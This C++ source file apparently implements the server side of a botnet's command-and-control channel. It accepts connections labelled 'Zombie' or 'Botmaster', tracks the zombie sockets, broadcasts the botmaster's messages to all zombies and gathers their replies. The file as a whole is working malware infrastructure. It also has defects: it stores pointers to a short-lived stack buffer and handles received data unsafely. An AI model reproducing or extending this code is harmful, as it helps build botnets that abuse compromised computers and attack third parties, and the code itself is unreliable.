#include "Server.h"

Server::Server(const char* ip, int port)
	: m_IpAddress(ip), m_Port(port)
{
}

bool Server::init()
{
	WSAData data;
	return !WSAStartup(MAKEWORD(2, 2), &data);
}

Server::~Server()
{
	cleanUp();
}

int Server::cleanUp()
{
	closesocket(m_Listening);
	for (SOCKET zombie : m_Zombies)
		closesocket(zombie);
	return WSACleanup();
}

bool Server::createListeningSocket()
{
	m_Listening = socket(AF_INET, SOCK_STREAM, 0);

	if (m_Listening != INVALID_SOCKET)
	{
		SOCKADDR_IN addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(m_Port);
		inet_pton(AF_INET, m_IpAddress.c_str(), &addr.sin_addr);

		int bindSocket = bind(m_Listening, (sockaddr*)&addr, sizeof(addr));
		if (bindSocket == SOCKET_ERROR)
		{
			std::cout << "Couldnt bind listening socket to address	Error code: " << WSAGetLastError() << std::endl;
			return false;
		}

		int listenSocket = listen(m_Listening, SOMAXCONN);
		if (listenSocket == SOCKET_ERROR)
		{
			std::cout << "Couldnt create listening socket	Error code: " << WSAGetLastError() << std::endl;
			return false;
		}

		std::cout << "Server listening..." << std::endl;
		return true;
	}
	else
	{
		std::cout << "Couldnt create socket	Error code: " << WSAGetLastError() << std::endl;
		return false;
	}
}

void Server::waiting()
{
	FD_ZERO(&m_Readfds);
	FD_SET(m_Listening, &m_Readfds);
	if(m_Botmaster != INVALID_SOCKET)	//Botmaster may not be logined
		FD_SET(m_Botmaster, &m_Readfds);

	SOCKET maxSd = m_Botmaster > m_Listening ? m_Botmaster : m_Listening;

	for (SOCKET zombie : m_Zombies)
	{
		FD_SET(zombie, &m_Readfds);		//already checked in acceptConnection() that its a valid socket
		maxSd = zombie > maxSd ? zombie : maxSd;
	}

	m_RdySocket = select(maxSd + 1, &m_Readfds, NULL, NULL, NULL);	//first parameter range in which he checks all sockets
}

int Server::acceptConnection()
{
	if (FD_ISSET(m_Listening, &m_Readfds))
	{
		SOCKET m_Client = accept(m_Listening, nullptr, nullptr);
		if (m_Client == INVALID_SOCKET)
			return WEIRDO;
		else
		{
			char buf[4096];
			SecureZeroMemory(buf, sizeof(buf));
			if (recv(m_Client, buf, sizeof(buf), 0))
			{
				std::string tmp = buf;
				if (tmp.substr(0, 6) == "Zombie")
				{
					m_Zombies.push_back(m_Client);
					return ZOMBIE;
				}
				else if (tmp.substr(0, 9) == "Botmaster" && m_Botmaster == INVALID_SOCKET)
				{
					m_Botmaster = m_Client;
					return BOTMASTER;
				}
				else
				{
					shutdown(m_Client, SD_SEND);
					closesocket(m_Client);
					return WEIRDO;
				}
			}
			else {
				shutdown(m_Client, SD_SEND);
				closesocket(m_Client);
				return WEIRDO;	//todo endless loop stops server from doing things
			}
		}
	}
	return -1;
}

void Server::sendToZombies(const char* msg, int size)
{
	for (SOCKET zombie : m_Zombies)
		sendToZombie(zombie, msg, size);
}

bool Server::sendToZombie(SOCKET zombie, const char* msg, int size)
{
	int sended = send(zombie, msg, size, 0);
	if (sended == SOCKET_ERROR)
		return false;
	return true;
}

bool Server::sendToBotmaster(const char* msg, int size)
{
	int sended = send(m_Botmaster, msg, size, 0);
	if (sended == SOCKET_ERROR)
		return false;
	return true;
}

bool Server::receive()
{
	bool rcvAnything = false;

	SecureZeroMemory(m_BotMasterBuf, sizeof(m_BotMasterBuf));
	if (FD_ISSET(m_Botmaster, &m_Readfds))
	{
		int received = recv(m_Botmaster, m_BotMasterBuf, sizeof(m_BotMasterBuf), 0);
		if (received == SOCKET_ERROR)	//received == 0 means that the connection got closed gracefully
		{
			std::cout << "Botmaster forces a disconnect" << std::endl; 
			m_BotMasterDisconnect = true;
		}
		else if (received == 0)
		{
			std::cout << "Botmaster disconnected succesfully" << std::endl;
			m_BotMasterDisconnect = true;
		}
		else
		{
			m_BotMasterDisconnect = false;
		}
		rcvAnything = true;
	}
	
	m_ZombieBufs.clear();
	//m_ZombieDisconnects.clear();	//getting cleared while disconnecting
	for (int i = 0; i < m_Zombies.size(); i ++)
	{
		if (FD_ISSET(m_Zombies[i], &m_Readfds))
		{
			char botBuf[4096];
			SecureZeroMemory(botBuf, sizeof(botBuf));
			int received = recv(m_Zombies[i], botBuf, sizeof(botBuf), 0);
			if (received == SOCKET_ERROR)	//received == 0 means that the connection got closed gracefully
			{
				std::cout << "Zombie forces a disconnect" << std::endl;
				m_ZombieDisconnects.push_back(i);	//store index in m_Zombies from clients who wants to disconnect -> better performance dont need to iterate and compare socket descriptor
			}
			else if (received == 0)
			{
				std::cout << "Zombie disconnected succesfully" << std::endl;
				m_ZombieDisconnects.push_back(i);
			}
			else
			{
				m_ZombieBufs.push_back(std::pair<SOCKET, const char*>(m_Zombies[i], botBuf));
			}
			rcvAnything = true;
		}
	}
	return rcvAnything;
}

const char* Server::getBotMasterMessage()
{
	return m_BotMasterBuf;
}

std::vector<const char*> Server::getBotMessages()
{
	std::vector<const char*> msgs;
	for(std::pair<SOCKET, const char*> msg : m_ZombieBufs)
		msgs.push_back(msg.second);
	return msgs;
}

bool Server::clientDisconnect()
{
	return m_BotMasterDisconnect || !m_ZombieDisconnects.empty();
}

void Server::closeConnections()
{
	//HANDLE NewEvent = WSACreateEvent();
	if (m_BotMasterDisconnect)
	{
		//WSAEventSelect(m_Botmaster, NewEvent, FD_CLOSE);
		shutdown(m_Botmaster, SD_SEND);
		closesocket(m_Botmaster);
		m_Botmaster = INVALID_SOCKET;
	}
	for (int i = m_ZombieDisconnects.size() - 1; i >= 0; i--)
	{
		//WSAEventSelect(m_Zombies[m_ZombieDisconnects[i]], NewEvent, FD_CLOSE);
		shutdown(m_Zombies[m_ZombieDisconnects[i]], SD_SEND);
		closesocket(m_Zombies[m_ZombieDisconnects[i]]);
		m_Zombies.erase(m_Zombies.begin() + m_ZombieDisconnects[i]);
		//because the index stored in m_ZombieDisconnects would stay the same altough the index in m_Zombies gets reduced (erase)
	}
		m_ZombieDisconnects.clear();
	
}
